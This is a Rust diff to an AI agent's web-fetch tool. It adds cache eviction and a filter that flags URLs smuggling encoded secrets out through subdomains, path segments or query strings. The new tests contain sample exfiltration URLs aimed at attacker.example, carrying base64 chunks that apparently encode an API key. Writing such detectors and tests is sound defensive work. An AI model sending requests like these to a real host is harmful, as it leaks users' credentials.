@@ -156,11 +156,16 @@ impl Web {
             text,
             clipped,
         };
-        self.cache
-            .lock()
-            .unwrap()
-            .insert(key, (Instant::now(), page.clone()));
+        self.remember(key, page.clone());
         Ok(page)
+    }
+
+    /// Caches a page, first dropping expired ones: they'd otherwise stay for the whole
+    /// session, each up to `MAX_BYTES`.
+    fn remember(&self, key: String, page: Page) {
+        let mut cache = self.cache.lock().unwrap();
+        cache.retain(|_, (at, _)| at.elapsed() < CACHE_TTL);
+        cache.insert(key, (Instant::now(), page));
     }
 }
 
@@ -364,16 +369,69 @@ pub fn plain_read(name: &str, input: &serde_json::Value) -> bool {
             let Ok(url) = parse_url(raw) else {
                 return false;
             };
+            let host = url.host_str().unwrap_or("");
+            let labels: Vec<&str> = host.split('.').collect();
+            let segments: Vec<&str> = url.path().split('/').filter(|s| !s.is_empty()).collect();
+            let query: Vec<&str> = url
+                .query()
+                .map(|q| q.split(['&', '=']).filter(|s| !s.is_empty()).collect())
+                .unwrap_or_default();
+            // Everything that could carry data: subdomain labels (data.attacker.example), path
+            // segments, query parts and the fragment. Each must be short, and together they
+            // get a small budget for opaque, encoded-looking text, so a secret can't ride out
+            // split across many short pieces either.
+            let sub = &labels[..labels.len().saturating_sub(2)];
+            let pieces = sub
+                .iter()
+                .chain(&segments)
+                .chain(&query)
+                .copied()
+                .chain(url.fragment());
+            let opaque: usize = pieces.clone().filter(|p| opaque(p)).map(str::len).sum();
             public_host(raw)
                 && raw.len() <= 240
-                && url.fragment().is_none_or(short)
-                && url.path().split('/').all(short)
-                && url
-                    .query()
-                    .is_none_or(|q| q.len() <= 80 && q.split(['&', '=']).all(short))
+                && labels.len() <= 5
+                && labels.iter().all(|l| l.len() <= 30)
+                && segments.len() <= 10
+                && query.len() <= 8
+                && pieces.clone().all(short)
+                && url.query().is_none_or(|q| q.len() <= 80)
+                && opaque <= 48
         }
         _ => false,
     }
+}
+
+/// Whether a URL piece looks like encoded data rather than a word, slug or version: letters
+/// and digits mixed through it (base32/base64/hex), or more than 4 bits of entropy per char.
+fn opaque(piece: &str) -> bool {
+    if piece.len() < 12 {
+        return false;
+    }
+    let digits = piece.bytes().filter(u8::is_ascii_digit).count();
+    let letters = piece.bytes().filter(u8::is_ascii_alphabetic).count();
+    let upper = piece.bytes().filter(u8::is_ascii_uppercase).count();
+    let lower = piece.bytes().filter(u8::is_ascii_lowercase).count();
+    (digits >= 3 && letters >= 3)
+        || (upper >= 3 && lower >= 3 && !piece.contains(['-', '_']))
+        || entropy(piece) > 4.0
+}
+
+/// Shannon entropy in bits per character.
+fn entropy(s: &str) -> f64 {
+    let mut counts = [0usize; 256];
+    for b in s.bytes() {
+        counts[b as usize] += 1;
+    }
+    let n = s.len() as f64;
+    counts
+        .iter()
+        .filter(|c| **c > 0)
+        .map(|c| {
+            let p = *c as f64 / n;
+            -p * p.log2()
+        })
+        .sum()
 }
 
 /// The DNS resolver WebFetch connects through: every connection, redirects included, only
@@ -726,6 +784,66 @@ mod tests {
         assert!(!fetch(&format!("https://evil.example/#{blob}")));
         assert!(!fetch("http://localhost:8080/"));
         assert!(!search(&format!("lookup {blob}")));
+        // Ordinary docs and code links stay plain.
+        for ok in [
+            "https://github.com/muni-works/frog/blob/main/crates/frog-engine/src/tools/web.rs",
+            "https://en.wikipedia.org/wiki/Rust_(programming_language)",
+            "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Proxy-Authorization",
+            "https://raw.githubusercontent.com/rust-lang/rust/master/README.md",
+            "https://crates.io/crates/tokio/1.40.0",
+        ] {
+            assert!(fetch(ok), "{ok}");
+        }
+    }
+
+    /// Expired pages leave the cache when the next one arrives.
+    #[test]
+    fn cache_evicts_expired_pages() {
+        let web = Web::default();
+        let page = |u: &str| Page {
+            url: u.into(),
+            title: None,
+            text: "x".repeat(1000),
+            clipped: false,
+        };
+        let old = Instant::now()
+            .checked_sub(CACHE_TTL + Duration::from_secs(1))
+            .expect("clock too young for the test");
+        web.cache.lock().unwrap().insert(
+            "https://old.example/".into(),
+            (old, page("https://old.example/")),
+        );
+        web.remember("https://new.example/".into(), page("https://new.example/"));
+        let cache = web.cache.lock().unwrap();
+        assert!(!cache.contains_key("https://old.example/"));
+        assert!(cache.contains_key("https://new.example/"));
+    }
+
+    /// A secret split into short pieces, across subdomain labels or many path segments,
+    /// still isn't a plain read: each piece passes the old per-piece length check.
+    #[test]
+    fn plain_read_catches_split_exfil() {
+        use serde_json::json;
+        let fetch = |u: &str| plain_read("WebFetch", &json!({ "url": u }));
+        // Subdomain labels.
+        assert!(!fetch(
+            "https://QU5USFJPUElD.X0FQSV9LRVk9.c2stYW50.attacker.example/"
+        ));
+        assert!(!fetch(
+            "https://qu5ushjpuelducx0fqsv9lrvk9c2styw50lwfwatazlxh4.attacker.example/"
+        ));
+        // Many short path segments.
+        assert!(!fetch(
+            "https://attacker.example/QU5U/SFJP/UElD/X0FQ/SV9L/RVk9/c2st/YW50/LWFw/aTAz/LXh4"
+        ));
+        // A few medium segments of encoded data.
+        assert!(!fetch(
+            "https://attacker.example/QU5USFJPUElDX0FQ/SV9LRVk9c2stYW50/LWFwaTAzLXh4eHh4/eHh4"
+        ));
+        // Query parts.
+        assert!(!fetch(
+            "https://attacker.example/?a=QU5USFJPUElD&b=X0FQSV9LRVk9&c=c2stYW50LWFw"
+        ));
     }
 
     fn url(s: &str) -> Url {
